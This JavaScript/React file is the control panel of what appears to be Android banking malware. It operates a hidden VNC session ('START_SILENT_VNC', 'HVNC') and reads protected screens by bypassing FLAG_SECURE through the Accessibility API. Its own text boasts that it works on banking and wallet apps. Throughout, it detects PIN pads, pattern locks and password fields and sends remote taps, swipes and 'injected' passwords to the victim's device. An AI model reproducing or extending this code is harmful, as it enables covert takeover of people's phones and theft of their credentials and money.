/**
 * ScreenReaderV2 — Standalone FLAG_SECURE Bypass Panel
 *
 * Coordinate rules — same as LiveScreen:
 *   Canvas touch events → normalized 0–1 + scale:'vnc_norm' → APK maps to real screen
 *   Node taps from hierarchy → raw device pixels (no scale param)
 */
import { useEffect, useRef, useState, useCallback } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

const APK_W = 350;
const APK_H = 650;

function apkRect(b) {
  if (!b) return null;
  const left   = b.left  ?? b.x ?? 0;
  const top    = b.top   ?? b.y ?? 0;
  const right  = b.right  ?? (left + (b.w ?? 0));
  const bottom = b.bottom ?? (top  + (b.h ?? 0));
  return { left, top, right, bottom };
}

function walkNode(raw, depth, out) {
  if (!raw || depth > 30) return;
  const text   = raw.text || raw.desc || raw.contentDescription || '';
  const bounds = apkRect(raw.bounds);
  const wide   = bounds && bounds.right - bounds.left > 0;
  if (text || wide) {
    out.push({
      text:          text.trim(),
      cls:           raw.class || raw.className || '',
      pkg:           raw.pkg || raw.packageName || raw.windowPackage || '',
      clickable:     !!raw.clickable,
      enabled:       raw.enabled !== false,
      checked:       !!raw.checked,
      focused:       !!raw.focused,
      scrollable:    !!raw.scrollable,
      editable:      !!raw.editable,
      password:      !!raw.password,
      longClickable: !!raw.longClickable,
      bounds,
      depth,
      id:            raw.id || raw.viewIdResourceName || '',
      isKeyboard:    !!(raw.isKeyboard || raw.isKeyboardKey),
      keyType:       raw.keyType || null,
      isPinDigit:    !!raw.isPinDigit,
      isPatternLock: !!raw.isPatternLock,
      isSwipeUnlock: !!raw.isSwipeUnlock,
      patternGrid:   raw.patternGrid || null,
      swipeHint:     raw.swipeHint   || null,
      hint:          raw.hint || '',
    });
  }
  const ch = raw.children || raw.childList || [];
  for (const c of ch) walkNode(c, depth + 1, out);
}

function parseHierarchy(raw) {
  const out = [];
  try {
    const p    = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const root = p?.hierarchy ?? p;
    const list = Array.isArray(root) ? root : [root];
    for (const r of list) walkNode(r, 0, out);
  } catch (_) {}
  return out;
}

function extractLines(nodes) {
  const tx = nodes.filter(n => n.text).sort((a, b) => {
    const ay = a.bounds ? (a.bounds.top + a.bounds.bottom) / 2 : 0;
    const by = b.bounds ? (b.bounds.top + b.bounds.bottom) / 2 : 0;
    return ay - by;
  });
  const rows = []; let row = [], lastY = -Infinity;
  for (const n of tx) {
    const y = n.bounds ? (n.bounds.top + n.bounds.bottom) / 2 : lastY + 40;
    if (Math.abs(y - lastY) > 22 && row.length) {
      rows.push([...row].sort((a, b) => (a.bounds?.left ?? 0) - (b.bounds?.left ?? 0)));
      row = [];
    }
    row.push(n); lastY = y;
  }
  if (row.length) rows.push(row);
  return rows;
}

const bCenter = b => b ? {
  x: Math.round((b.left + b.right)  / 2),
  y: Math.round((b.top  + b.bottom) / 2),
} : null;

// ─────────────────────────────────────────────────────────────────────────────
export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
  const canvasRef   = useRef(null);
  const ctxRef      = useRef(null);
  const bitmapRef   = useRef(null);
  const dirtyRef    = useRef(false);
  const rafRef      = useRef(null);
  const fpsDecRef   = useRef(0);
  const latRef      = useRef(performance.now());
  const tStartRef   = useRef(null);
  const mStartRef   = useRef(null);
  const autoRef     = useRef(null);
  const ocrRef      = useRef(null);

  const setVnc = useStore(s => s.setVncActive);

  const [nodes, setNodes]         = useState([]);
  const [lines, setLines]         = useState([]);
  const [rawData, setRawData]     = useState('');
  const [tab, setTab]             = useState('ocr');
  const [filter, setFilter]       = useState('');
  const [toast, setToast]         = useState(null);
  const [srTs, setSrTs]           = useState(null);
  const [pkg, setPkg]             = useState('');
  const [liveMode, setLiveMode]   = useState(false);
  const [showVnc, setShowVnc]     = useState(false);
  const [vncOn, setVncOn]         = useState(false);
  const [fps, setFps]             = useState(0);
  const [latMs, setLatMs]         = useState(0);
  const [typeText, setTypeText]   = useState('');
  const [tapX, setTapX]           = useState('');
  const [tapY, setTapY]           = useState('');
  const [pinDigits, setPinDigits] = useState([]);

  // ── RAF render loop ────────────────────────────────────────────────────────
  useEffect(() => {
    function loop() {
      if (dirtyRef.current) {
        const bmp = bitmapRef.current;
        if (!ctxRef.current && canvasRef.current) {
          ctxRef.current = canvasRef.current.getContext('2d', { alpha: false, desynchronized: true });
          if (ctxRef.current) ctxRef.current.imageSmoothingEnabled = false;
        }
        if (bmp && ctxRef.current) ctxRef.current.drawImage(bmp, 0, 0);
        dirtyRef.current = false;
      }
      rafRef.current = requestAnimationFrame(loop);
    }
    rafRef.current = requestAnimationFrame(loop);
    return () => {
      cancelAnimationFrame(rafRef.current);
      bitmapRef.current?.close?.();
    };
  }, []);

  // ── Binary VNC pipeline ────────────────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const now = performance.now();
      setLatMs(Math.round(now - latRef.current));
      latRef.current = now;
      fpsDecRef.current++;
      createImageBitmap(new Blob([buf], { type: 'image/jpeg' })).then(bmp => {
        bitmapRef.current?.close?.();
        bitmapRef.current = bmp;
        dirtyRef.current  = true;
      }).catch(() => {});
    });
    const fpsT = setInterval(() => { setFps(fpsDecRef.current); fpsDecRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(fpsT); };
  }, [deviceId]);

  // ── Hierarchy + VNC status ─────────────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;
      if (msg.type === 'screen_hierarchy') {
        const raw = msg.data || '{}';
        try {
          const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
          setPkg(parsed.package || '');
          const n = parseHierarchy(raw);
          const l = extractLines(n);
          setNodes(n); setLines(l);
          setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
          setSrTs(msg.ts);
          setPinDigits(n.filter(nd => nd.isPinDigit && nd.text && nd.clickable));
          showToast('REQUEST_HIERARCHY com sucesso!');
          setTimeout(() => ocrRef.current?.scrollTo({ top: 0, behavior: 'smooth' }), 40);
        } catch (_) {}
      }
      if (msg.type === 'vnc_status') { setVncOn(!!msg.active); setVnc(!!msg.active); }
    });
    return unsub;
  }, [deviceId]);

  // ── Live mode ──────────────────────────────────────────────────────────────
  useEffect(() => {
    clearInterval(autoRef.current);
    if (liveMode) {
      sendCmd('REQUEST_HIERARCHY');
      autoRef.current = setInterval(() => sendCmd('REQUEST_HIERARCHY'), 500);
    }
    return () => clearInterval(autoRef.current);
  }, [liveMode, sendCmd]);

  useEffect(() => { sendCmd('REQUEST_HIERARCHY'); }, []);

  function showToast(m) { setToast(m); setTimeout(() => setToast(null), 2200); }

  // ── Coordinate helpers ─────────────────────────────────────────────────────
  function normCoords(clientX, clientY) {
    const c = canvasRef.current; if (!c) return { x: 0.5, y: 0.5 };
    const r = c.getBoundingClientRect();
    return {
      x: Math.max(0.001, Math.min(0.999, (clientX - r.left) / r.width)),
      y: Math.max(0.001, Math.min(0.999, (clientY - r.top)  / r.height)),
    };
  }

  // ── Touch / mouse ──────────────────────────────────────────────────────────
  const onTouchStart = useCallback(e => {
    e.preventDefault();
    const t = e.touches[0];
    tStartRef.current = { clientX: t.clientX, clientY: t.clientY, ts: Date.now() };
  }, []);

  const onTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!tStartRef.current) return;
    const t = e.changedTouches[0];
    const { clientX: sx, clientY: sy, ts } = tStartRef.current;
    const dt   = Date.now() - ts;
    const dist = Math.hypot(t.clientX - sx, t.clientY - sy);
    tStartRef.current = null;
    if (dist < 14) {
      const { x, y } = normCoords(sx, sy);
      sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x, y, scale: 'vnc_norm' });
    } else {
      const s = normCoords(sx, sy), end = normCoords(t.clientX, t.clientY);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd]);

  const onMouseDown = useCallback(e => {
    mStartRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now() };
  }, []);

  const onMouseUp = useCallback(e => {
    if (!mStartRef.current) return;
    const { clientX: sx, clientY: sy, ts } = mStartRef.current;
    const dt   = Date.now() - ts;
    const dist = Math.hypot(e.clientX - sx, e.clientY - sy);
    mStartRef.current = null;
    if (dist < 6) {
      const { x, y } = normCoords(sx, sy);
      sendCmd('TAP', { x, y, scale: 'vnc_norm' });
    } else {
      const s = normCoords(sx, sy), end = normCoords(e.clientX, e.clientY);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd]);

  // Node taps → real device pixels (hierarchy bounds are already in device px)
  function tapNode(nd) {
    const c = bCenter(nd.bounds);
    if (c) { sendCmd('TAP', { x: c.x, y: c.y }); showToast(`TAP → ${nd.text || nd.cls}`); }
  }

  const filtered = filter
    ? nodes.filter(n =>
        n.text?.toLowerCase().includes(filter.toLowerCase()) ||
        n.cls?.toLowerCase().includes(filter.toLowerCase()) ||
        n.id?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  const patternNodes  = nodes.filter(n => n.isPatternLock && n.patternGrid);
  const swipeNodes    = nodes.filter(n => n.isSwipeUnlock && n.swipeHint);
  const pwFields      = nodes.filter(n => n.password && n.editable);

  // ─────────────────────────────────────────────────────────────────────────
  return (
    <div className="fade-up">

      {/* Toast */}
      {toast && (
        <div style={{
          position: 'fixed', top: 70, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(10,8,2,.97)', border: '1px solid var(--gold)',
          borderRadius: 12, padding: '10px 18px', zIndex: 9999,
          maxWidth: '86vw', textAlign: 'center', pointerEvents: 'none',
          boxShadow: '0 4px 32px rgba(0,0,0,.65)',
        }}>
          <div style={{ color: '#00c864', fontSize: 15, marginBottom: 2 }}>✓</div>
          <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 11 }}>Comando</div>
          <div style={{ color: '#00c864', fontWeight: 800, fontSize: 13 }}>REQUEST_HIERARCHY</div>
          <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 11 }}>com sucesso!</div>
        </div>
      )}

      {/* ── Toolbar ── */}
      <div className="row-sb mb8">
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
            EDITAR V2 ✏
          </div>
          <div className="row gap6 mt4">
            <span style={{ fontSize: 11, color: 'var(--text2)' }}>LEITOR OCR</span>
            <span style={{ fontSize: 11, color: '#00c864', fontWeight: 700 }}>⚡</span>
            <span style={{ fontSize: 11, fontWeight: 700,
              color: nodes.filter(n=>n.text).length > 0 ? '#00c864' : 'var(--text3)' }}>
              {nodes.filter(n=>n.text).length > 0
                ? `${Math.min(99, nodes.filter(n=>n.text).length)}%` : '—'}
            </span>
            {pkg && <span style={{ fontSize: 10, color: 'var(--text3)' }}>{pkg.split('.').slice(-1)[0]}</span>}
          </div>
        </div>
        <div className="row gap5" style={{ flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          <button className={`btn btn-sm ${showVnc ? 'btn-blue' : 'btn-ghost'}`}
            onClick={() => setShowVnc(v => !v)}
            style={{ padding: '4px 10px', fontSize: 11, fontWeight: 700 }}>
            🖥 VNC
          </button>
          <button className={`btn btn-sm ${liveMode ? 'btn-red' : 'btn-ghost'}`}
            onClick={() => setLiveMode(v => !v)}
            style={{ padding: '4px 10px', fontSize: 11, fontWeight: 700 }}>
            {liveMode ? '🔴 LIVE' : '⭕ LIVE'}
          </button>
          <button className="btn btn-ghost btn-sm"
            onClick={() => { setLiveMode(false); onBack(); }}>←</button>
        </div>
      </div>

      {/* Status */}
      <div className="row gap6 mb8">
        <span className="pill pill-green" style={{ fontSize: 10 }}>🔓 FLAG_SECURE BYPASS</span>
        {nodes.length > 0 && (
          <span className="pill pill-gold" style={{ fontSize: 10 }}>
            {nodes.filter(n=>n.text).length} textos
          </span>
        )}
        {vncOn && (
          <span className="pill pill-blue" style={{ fontSize: 10 }}>▶ {fps} FPS · {latMs}ms</span>
        )}
        {liveMode && <span className="pill pill-red" style={{ fontSize: 10 }}>🔴 LIVE 500ms</span>}
      </div>

      {/* VNC Canvas (optional) */}
      {showVnc && (
        <>
          <div className="vnc-wrap mb8"
            style={{ position: 'relative', touchAction: 'none',
              cursor: vncOn ? 'crosshair' : 'default' }}
            onTouchStart={onTouchStart} onTouchEnd={onTouchEnd}
            onMouseDown={onMouseDown}   onMouseUp={onMouseUp}
          >
            <canvas ref={canvasRef} width={APK_W} height={APK_H} className="vnc-canvas" />
            {!vncOn && (
              <div className="vnc-overlay">
                <div className="spin" />
                <div style={{ fontSize: 12, color: 'var(--text2)', marginTop: 8 }}>
                  VNC aguardando...
                </div>
              </div>
            )}
            <div className="vnc-hud">
              <span className="vnc-fps" style={{ background: 'rgba(20,80,200,.85)' }}>HVNC</span>
              <span className="vnc-fps">{fps} FPS · {latMs}ms</span>
            </div>
          </div>
          <div className="grid g2 mb8">
            <button className="btn btn-gold btn-block btn-sm"
              onClick={() => { sendCmd('START_SILENT_VNC'); ws.subscribe('vnc', deviceId); setVncOn(true); setVnc(true); }}>
              ▶ VNC ON
            </button>
            <button className="btn btn-red btn-block btn-sm"
              onClick={() => { sendCmd('STOP_SILENT_VNC'); ws.unsubscribe('vnc', deviceId); setVncOn(false); setVnc(false); }}>
              ⏹ VNC OFF
            </button>
          </div>
        </>
      )}

      {/* Actions */}
      <div className="row gap6 mb8" style={{ flexWrap: 'wrap' }}>
        <button className="btn btn-gold btn-sm"
          onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('Aguardando...'); }}>
          🌳 REQUEST_HIERARCHY
        </button>
        <button className="btn btn-ghost btn-sm"
          onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: true })}>👁 SR ON</button>
        <button className="btn btn-ghost btn-sm"
          onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: false })}>⏹ SR OFF</button>
        <button className="btn btn-ghost btn-sm"
          onClick={() => { setNodes([]); setLines([]); setRawData(''); setPinDigits([]); }}>🗑</button>
      </div>

      {/* Quick action: PIN digits */}
      {pinDigits.length > 0 && (
        <div className="card card-sm mb8" style={{ border: '1px solid var(--blue)' }}>
          <div className="txt-xs txt-dim mb6" style={{ color: 'var(--blue)' }}>⌨ PIN DETECTADO</div>
          <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
            {pinDigits.map((nd, i) => (
              <button key={i} className="btn btn-blue btn-sm"
                style={{ minWidth: 38, fontSize: 15, fontWeight: 800 }}
                onClick={() => tapNode(nd)}>
                {nd.text}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Quick action: Pattern lock */}
      {patternNodes.length > 0 && patternNodes[0].patternGrid && (
        <div className="card card-sm mb8" style={{ border: '1px solid var(--blue)' }}>
          <div className="txt-xs txt-dim mb6" style={{ color: 'var(--blue)' }}>⊞ PATTERN LOCK</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 6, maxWidth: 128 }}>
            {patternNodes[0].patternGrid.map((p, pi) => (
              <button key={pi} className="btn btn-ghost btn-sm"
                style={{ fontSize: 12, fontWeight: 700 }}
                onClick={() => sendCmd('TAP', { x: p.x, y: p.y })}>
                {pi + 1}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Quick action: Swipe unlock */}
      {swipeNodes.length > 0 && (
        <div className="card card-sm mb8" style={{ border: '1px solid rgba(212,149,10,.5)' }}>
          <div className="txt-xs txt-dim mb6" style={{ color: 'var(--gold)' }}>👆 SWIPE UNLOCK</div>
          <button className="btn btn-gold btn-sm"
            onClick={() => {
              const h = swipeNodes[0].swipeHint;
              if (h) sendCmd('SWIPE', { x1: h.sx, y1: h.sy, x2: h.ex, y2: h.ey, duration: 300 });
            }}>
            ↑ EXECUTAR SWIPE
          </button>
        </div>
      )}

      {/* Quick action: Password field */}
      {pwFields.length > 0 && (
        <div className="card card-sm mb8" style={{ border: '1px solid var(--red)' }}>
          <div className="txt-xs txt-dim mb6" style={{ color: 'var(--red)' }}>🔒 CAMPO SENHA DETECTADO</div>
          <div className="input-row">
            <input className="input" placeholder="Injetar senha..."
              value={typeText} onChange={e => setTypeText(e.target.value)} />
            <button className="btn btn-red btn-sm"
              onClick={() => {
                tapNode(pwFields[0]);
                setTimeout(() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }, 120);
              }}>
              💉 INJETAR
            </button>
          </div>
        </div>
      )}

      {/* Tabs */}
      <div className="row gap6 mb8">
        {[['ocr','📄 OCR TEXT'],['nodes','🔵 NODES'],['raw','{ } RAW']].map(([id, lbl]) => (
          <button key={id} onClick={() => setTab(id)}
            className={`btn btn-sm ${tab === id ? 'btn-gold' : 'btn-ghost'}`}>{lbl}</button>
        ))}
        {srTs && (
          <span className="txt-xs txt-dim" style={{ alignSelf: 'center', marginLeft: 'auto' }}>
            {new Date(srTs).toLocaleTimeString()}
          </span>
        )}
      </div>

      {/* Stats */}
      {nodes.length > 0 && (
        <div className="row gap6 mb8">
          <span className="pill pill-green"  style={{ fontSize: 10 }}>{nodes.filter(n=>n.text).length} textos</span>
          <span className="pill pill-gold"   style={{ fontSize: 10 }}>{nodes.filter(n=>n.clickable).length} clicáveis</span>
          <span className="pill pill-purple" style={{ fontSize: 10 }}>{nodes.filter(n=>n.isKeyboard).length} teclado</span>
          <span className="pill pill-dim"    style={{ fontSize: 10 }}>{lines.length} linhas</span>
          {nodes.filter(n=>n.password).length > 0 && (
            <span className="pill pill-red" style={{ fontSize: 10 }}>
              🔒 {nodes.filter(n=>n.password).length}
            </span>
          )}
        </div>
      )}

      {/* OCR tab */}
      {tab === 'ocr' && (
        <div ref={ocrRef} style={{ maxHeight: 500, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
          {lines.length === 0 && (
            <div className="no-data" style={{ padding: 48 }}>
              <div style={{ fontSize: 40, marginBottom: 12 }}>🌳</div>
              <div style={{ fontSize: 14, fontWeight: 700 }}>Toque REQUEST_HIERARCHY</div>
              <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 4 }}>
                Bypass FLAG_SECURE via Accessibility API<br />
                Funciona em qualquer app — banking, carteiras, tudo
              </div>
            </div>
          )}
          {lines.map((row, ri) => (
            <div key={ri} style={{
              display: 'flex', gap: 4, flexWrap: 'wrap', padding: '3px 8px',
              borderRadius: 6, background: ri % 2 === 0 ? 'rgba(212,149,10,.04)' : 'transparent',
            }}>
              {row.map((nd, ni) => (
                <button key={ni} onClick={() => tapNode(nd)}
                  style={{
                    background: nd.isPinDigit
                      ? 'rgba(59,122,240,.18)'
                      : nd.password
                      ? 'rgba(224,48,96,.12)'
                      : nd.isKeyboard
                      ? 'rgba(152,85,232,.12)'
                      : nd.clickable
                      ? 'rgba(212,149,10,.12)' : 'rgba(255,255,255,.04)',
                    border: `1px solid ${
                      nd.isPinDigit ? 'rgba(59,122,240,.5)'  :
                      nd.password   ? 'rgba(224,48,96,.4)'   :
                      nd.isKeyboard ? 'rgba(152,85,232,.4)'  :
                      nd.clickable  ? 'rgba(212,149,10,.4)'  : 'rgba(255,255,255,.08)'}`,
                    borderRadius: 6, padding: '4px 10px',
                    color: nd.isPinDigit ? 'var(--blue)'   :
                           nd.password   ? 'var(--red)'    :
                           nd.isKeyboard ? 'var(--purple)' :
                           nd.clickable  ? 'var(--gold)'   : 'var(--text2)',
                    fontSize: 12, fontWeight: nd.clickable ? 700 : 400,
                    cursor: nd.clickable ? 'pointer' : 'default',
                    fontFamily: 'var(--font)', transition: 'background .1s',
                    opacity: nd.enabled ? 1 : 0.5,
                  }}
                  title={`${nd.cls}\n[${nd.bounds?.left},${nd.bounds?.top}→${nd.bounds?.right},${nd.bounds?.bottom}]`}
                >
                  {nd.text}
                  {nd.password    && <span style={{ marginLeft: 4, fontSize: 10 }}>🔒</span>}
                  {nd.isPatternLock && <span style={{ marginLeft: 4, fontSize: 10, color:'var(--blue)' }}>⊞</span>}
                  {nd.checked     && <span style={{ marginLeft: 4, color: '#00c864' }}>✓</span>}
                </button>
              ))}
            </div>
          ))}
        </div>
      )}

      {/* Nodes tab */}
      {tab === 'nodes' && (
        <div>
          <div className="input-row mb8">
            <input className="input" placeholder="Filtrar por texto, classe, id..."
              value={filter} onChange={e => setFilter(e.target.value)} />
            <span className="txt-xs txt-dim" style={{ alignSelf: 'center', whiteSpace: 'nowrap' }}>
              {filtered.length}/{nodes.length}
            </span>
          </div>
          <div style={{ maxHeight: 520, overflowY: 'auto' }}>
            {filtered.slice(0, 300).map((nd, i) => (
              <div key={i} className="card card-sm mb4"
                style={{
                  borderLeft: `3px solid ${
                    nd.isPinDigit  ? 'var(--blue)'   :
                    nd.password    ? 'var(--red)'    :
                    nd.isKeyboard  ? 'var(--purple)' :
                    nd.clickable   ? 'var(--gold)'   :
                    nd.focused     ? '#3b7af0'       : 'var(--border)'}`,
                  paddingLeft: 10 + nd.depth * 6,
                  cursor: nd.clickable ? 'pointer' : 'default',
                  opacity: nd.enabled ? 1 : 0.5,
                }}
                onClick={() => nd.clickable && tapNode(nd)}
              >
                <div className="row-sb">
                  <div style={{ flex: 1, minWidth: 0 }}>
                    {nd.text && (
                      <div style={{ fontWeight: 600, fontSize: 13, color:'var(--text)', marginBottom: 2 }}>
                        {nd.text}
                      </div>
                    )}
                    {nd.hint && (
                      <div style={{ fontSize: 11, color: 'var(--text3)', marginBottom: 2 }}>
                        {nd.hint}
                      </div>
                    )}
                    <div className="txt-xs txt-mono txt-dim"
                      style={{ overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                      {nd.cls.split('.').pop()}
                      {nd.id && <span style={{ marginLeft: 6, color:'var(--text3)' }}>
                        #{nd.id.split('/').pop()}
                      </span>}
                      {nd.pkg && <span style={{ marginLeft: 6, color:'var(--text3)', fontSize: 10 }}>
                        {nd.pkg.split('.').slice(-1)[0]}
                      </span>}
                    </div>
                  </div>
                  <div style={{ display:'flex', flexDirection:'column', gap:2, alignItems:'flex-end', flexShrink:0 }}>
                    {nd.clickable    && <span className="pill pill-gold"   style={{ fontSize:9, padding:'1px 5px' }}>TAP</span>}
                    {nd.scrollable   && <span className="pill pill-blue"   style={{ fontSize:9, padding:'1px 5px' }}>SCROLL</span>}
                    {nd.editable     && <span className="pill pill-dim"    style={{ fontSize:9, padding:'1px 5px' }}>EDIT</span>}
                    {nd.isPinDigit   && <span className="pill pill-blue"   style={{ fontSize:9, padding:'1px 5px' }}>PIN</span>}
                    {nd.isKeyboard   && <span className="pill pill-purple" style={{ fontSize:9, padding:'1px 5px' }}>⌨</span>}
                    {nd.isPatternLock && <span className="pill pill-blue"  style={{ fontSize:9, padding:'1px 5px' }}>⊞</span>}
                    {nd.isSwipeUnlock && <span className="pill pill-gold"  style={{ fontSize:9, padding:'1px 5px' }}>SWIPE</span>}
                    {nd.password     && <span className="pill pill-red"    style={{ fontSize:9, padding:'1px 5px' }}>🔒</span>}
                    {nd.checked      && <span className="pill pill-green"  style={{ fontSize:9, padding:'1px 5px' }}>✓ ON</span>}
                    {nd.focused      && <span className="pill pill-blue"   style={{ fontSize:9, padding:'1px 5px' }}>⊙</span>}
                    {nd.longClickable && <span className="pill pill-dim"   style={{ fontSize:9, padding:'1px 5px' }}>HOLD</span>}
                  </div>
                </div>
                {nd.bounds && (
                  <div className="txt-xs txt-mono txt-dim mt4" style={{ fontSize: 10 }}>
                    [{nd.bounds.left},{nd.bounds.top}→{nd.bounds.right},{nd.bounds.bottom}]
                    {' '}({nd.bounds.right-nd.bounds.left}×{nd.bounds.bottom-nd.bounds.top})
                  </div>
                )}
                {nd.isPatternLock && nd.patternGrid && (
                  <div style={{ display:'flex', gap:4, marginTop:6, flexWrap:'wrap' }}>
                    {nd.patternGrid.map((p, pi) => (
                      <button key={pi} className="btn btn-ghost btn-xs"
                        style={{ minWidth:28, fontSize:11, fontWeight:700 }}
                        onClick={ev => { ev.stopPropagation(); sendCmd('TAP', { x:p.x, y:p.y }); }}>
                        {pi+1}
                      </button>
                    ))}
                  </div>
                )}
                {nd.isSwipeUnlock && nd.swipeHint && (
                  <button className="btn btn-ghost btn-xs mt4"
                    onClick={ev => {
                      ev.stopPropagation();
                      const h = nd.swipeHint;
                      sendCmd('SWIPE', { x1:h.sx, y1:h.sy, x2:h.ex, y2:h.ey, duration:300 });
                    }}>↑ SWIPE UNLOCK</button>
                )}
              </div>
            ))}
            {filtered.length > 300 && (
              <div className="txt-xs txt-dim" style={{ textAlign:'center', padding:8 }}>
                ... {filtered.length - 300} nós restantes
              </div>
            )}
          </div>
        </div>
      )}

      {/* Raw tab */}
      {tab === 'raw' && (
        <div>
          <div className="row-sb mb6">
            <span className="txt-xs txt-dim">{rawData.length} chars · {nodes.length} nós</span>
            <button className="btn btn-ghost btn-xs"
              onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}>
              📋 COPIAR
            </button>
          </div>
          <div className="term"
            style={{ height: 520, overflowY:'auto', whiteSpace:'pre', fontSize:10, lineHeight:1.5 }}>
            {rawData || 'Nenhum dado — toque REQUEST_HIERARCHY.'}
          </div>
        </div>
      )}

      {/* Nav + inject */}
      <div className="section-title mt12">Navegação Rápida</div>
      <div className="grid g4 mb8">
        {[['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['💡','WAKEUP'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['🔒','LOCK_DEVICE'],['📷','SNAP_SCREEN'],
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>

      <div className="section-title">Injetar Texto</div>
      <div className="card card-sm mb8">
        <div className="txt-xs txt-dim mb6">Coordenadas brutas (px reais do dispositivo)</div>
        <div className="input-row">
          <input className="input" placeholder="Texto..."
            value={typeText} onChange={e => setTypeText(e.target.value)}
            onKeyDown={e => { if (e.key==='Enter') { sendCmd('TYPE',{text:typeText}); setTypeText(''); } }} />
          <input className="input" placeholder="X" type="number" value={tapX}
            onChange={e => setTapX(e.target.value)} style={{ width:56 }} />
          <input className="input" placeholder="Y" type="number" value={tapY}
            onChange={e => setTapY(e.target.value)} style={{ width:56 }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => {
              if (tapX || tapY) sendCmd('TAP', { x:+tapX, y:+tapY });
              if (typeText) setTimeout(() => { sendCmd('TYPE',{text:typeText}); setTypeText(''); }, 80);
            }}>SEND</button>
        </div>
      </div>

      <div style={{ height: 24 }} />
    </div>
  );
}
